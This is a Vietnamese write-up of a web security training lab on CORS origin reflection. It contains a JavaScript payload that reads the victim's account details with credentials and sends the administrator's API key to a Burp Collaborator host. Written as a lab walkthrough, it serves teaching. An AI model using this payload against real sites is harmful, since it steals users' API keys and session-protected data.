## CORS vulnerability with basic origin reflection



Sau khi truy cập vào bằng tài khoản wiener, mỗi người dùng sẽ có 1 khóa API key riêng và để giải quyết challenge này chúng ta cần truy xuất khóa API của administrator.

Tiêu đề phản hồi `Access-Control-Allow-Credentials` với giá trị true cho thấy nó bao gồm thông tin đăng nhập. Header này có thể hoạt động với [XMLHttpRequest.withCredentials](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials) trong phương thức khởi tạo fetch API như sau:

``` apl
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);

```

![image](https://user-images.githubusercontent.com/68894302/174548734-db51031a-e822-4260-9fe0-e0ce3ec9250d.png)

Nếu chúng ta thêm vào header Origin thì phản hồi trả về  `Access-Control-Allow-Origin: $URL`. 

![image](https://user-images.githubusercontent.com/68894302/174546967-214144fa-eff9-4c58-9d10-21a8b7fe5571.png)

Bởi vì ứng dụng phản ánh nguồn gốc tùy ý trong `Access-Control-Allow-Origin`, điều này có nghĩa là hoàn toàn bất kỳ miền nào cũng có thể truy cập tài nguyên từ miền dễ bị tấn công. Phản hồi chứa bất kỳ thông tin nhạy  cảm khóa API, chúng ta có thể truy xuất thông tin này bằng cách đặt tập lệnh sau trên máy chủ exploit:

``` apl
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a6000e10431a31cc090124100fd0094.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//x53hff3il6jf1ljbhom5v85fv61wpl.burpcollaborator.net/?key='+this.responseText;
};
```



![image](https://user-images.githubusercontent.com/68894302/174548555-5382ce14-2444-4611-ae27-4f1106e3c192.png)

Submit secret key của admin.

![image](https://user-images.githubusercontent.com/68894302/174549124-bcab02a1-636b-406c-9d77-4560702e1f40.png)